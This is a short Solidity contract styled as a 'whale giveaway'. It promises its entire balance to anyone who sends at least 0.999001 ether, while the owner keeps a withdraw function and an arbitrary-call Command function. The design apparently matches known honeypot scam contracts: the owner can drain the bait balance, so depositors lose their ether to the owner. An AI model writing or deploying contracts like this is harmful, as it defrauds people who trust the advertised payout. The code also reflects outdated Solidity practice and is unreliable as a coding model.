pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public Owner;

    uint public constant minEligibility = 0.999001 ether;

    function WhaleGiveaway2() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(msg.value);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr.call.value(msg.value)(data));
    }
}